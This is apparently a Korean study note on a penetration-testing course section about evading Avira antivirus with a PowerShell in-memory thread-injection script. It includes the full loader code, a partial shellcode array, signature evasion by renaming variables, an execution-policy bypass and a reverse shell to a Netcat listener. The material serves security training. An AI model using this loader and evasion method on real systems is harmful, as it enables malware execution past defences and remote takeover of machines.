# 15.3.2 스레드 인젝션으로 AV 회피

> **Evading AV with Thread Injection** · PEN-200 §15.3.2

모든 AV 제품을 한 번에 뚫는 보편 해법을 찾는 것은 어렵고 시간이 많이 들며 사실상 불가능함. 침투 테스트의 시간 제약을 생각하면 **대상 네트워크에 실제로 배치된 제품 하나를 겨냥하는 편이 훨씬 효율적임.**

실습 대상은 Windows 11 클라이언트의 Avira Free Security 1.1.68.29553 임. RDP 로 접속해 Avira 를 띄우고 왼쪽 메뉴의 Security > Protection Options 에서 **Real-Time Protection 이 켜져 있는지 먼저 확인함**(꺼져 있으면 수동으로 켬).

AV 를 시험할 때의 첫 단계는 **AV 가 의도대로 동작하는지 확인하는 것**임. 앞서 만든 Metasploit PE 를 Windows 클라이언트로 옮기면 거의 즉시 악성 판정 경고가 뜨고 파일이 차단됨. AV 는 커널 수준에서 파일시스템 동작을 막거나, 악성 샘플을 AV 만 접근 가능한 암호화 저장소에 넣는 방식으로 격리를 강제함.

![[PEN200-Fig-238.png]]

*표준 msfvenom PE 를 옮기자마자 뜬 Avira 격리 알림 — 실시간 보호가 살아 있다는 확인*

대상 환경의 제약 수준에 따라서는 PowerShell 로 AV 를 우회할 수 있음. 여기서 쓰는 것은 앞 단위의 원격 프로세스 메모리 인젝션인데, **차이는 대상 프로세스를 «현재 실행 중인 프로세스» 자신 — x86 PowerShell 인터프리터 — 으로 잡는다는 것**임.

PowerShell 의 강력한 점은 Windows API 와 직접 상호작용할 수 있다는 것이고, 덕분에 인메모리 인젝션 절차를 스크립트로 구현할 수 있음. PE 대신 스크립트를 돌리는 이점 — 스크립트는 인터프리터 안에서 해석되는 텍스트이지 실행 코드가 아니라 **벤더가 악성 여부를 판정하기 어려움**. 단 제품별 편차가 크고, 악성 판정이 나더라도 변수명·주석·로직만 바꾸면 되며 **재컴파일이 필요 없음** — 이 점이 뒤의 우회를 성립시킴.

스크립트는 `kernel32.dll` 의 `VirtualAlloc`·`CreateThread` 와 `msvcrt.dll` 의 `memset` 을 임포트하는 것으로 시작함. 각각 메모리 할당, 실행 스레드 생성, 할당된 메모리에 임의 데이터 기록을 담당함. 본 로직은 `VirtualAlloc` 으로 블록을 잡고 `$sc` 바이트 배열의 각 바이트를 `memset` 으로 그 메모리에 쓴 다음, `CreateThread` 로 별도 스레드에서 실행하고 무한 대기하는 흐름임. **할당과 스레드 생성이 원격이 아니라 현재 프로세스(powershell.exe) 안에서 일어남에 주의.**

```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
$winFunc =
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
[Byte[]];
[Byte[]]$sc = <place your shellcode here>;
$size = 0x1000;
if ($sc.Length -gt 0x1000) {$size = $sc.Length};
$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i),
$sc[$i], 1)};
$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

*변수명 변경 전 스크립트의 VirusTotal 결과 — 59개 중 28개 탐지*

**왜 이 상태로는 걸리는가** — 스크립트는 해석되는 텍스트 파일이라 구조화된 데이터 형식을 가진 바이너리처럼 지문을 뜨기가 쉽지 않음. 그래서 벤더는 변수명·함수명처럼 **의미 있는 코드 조각의 정적 문자열 시그니처**에 의존함. 뒤집으면, 그 이름들을 평범하게 바꾸는 것만으로 시그니처가 어긋남. 여기서는 `Add-Type` 의 하드코딩된 클래스명 `Win32` 를 `iWin32` 로, `sc` 와 `winFunc` 를 각각 `var1`·`var2` 로 바꿈.

```
$var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -
passthru;
[Byte[]];
[Byte[]] $var1 =
0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,
0x8b,0x52,0x14,0x8b,0x72,0x28
...
$size = 0x1000;
if ($var1.Length -gt 0x1000) {$size = $var1.Length};
$x = $var2::VirtualAlloc(0,$size,0x3000,0x40);
for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i),
$var1[$i], 1)};
$var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

*변수·클래스 이름을 바꾼 판*

`bypass.ps1` 로 저장해 Windows 11 클라이언트로 옮기고 Security > Virus Scans > Quick Scan 으로 검사하면 악성이 아니라고 나옴.

*실행 정책에 막혀 스크립트가 시작조차 못 함 (원문 Listing 346)*

이 정책은 시스템 단위가 아니라 사용자 단위로 설정되므로 현재 사용자 범위에서 바꿀 수 있음. 아래는 정책을 전역으로 바꾸는 방법이고, 실행할 때마다 `-ExecutionPolicy Bypass` 플래그를 주는 스크립트 단위 방식도 있음. 다만 PowerShell Execution Policy 는 Active Directory GPO 로 강제될 수 있고, 그 경우에는 다른 우회 벡터를 찾아야 함.

*Netcat 리스너에 붙은 리버스셸*

여기까지가 Avira 탐지를 실제로 회피한 결과임. 다만 성숙한 조직은 실행되는 스크립트의 «내용»을 분석하는 머신러닝 소프트웨어를 돌리므로, 무엇을 유해로 보느냐에 따라 이 정도 스크립트도 대상 환경에 맞춰 더 손봐야 할 수 있음. 나아가 **EDR 이 제대로 구축되고 숙련된 SOC 가 운영 중이면 조용히 경보만 올리고 몇 분 만에 공격이 무력화될 수 있음.**
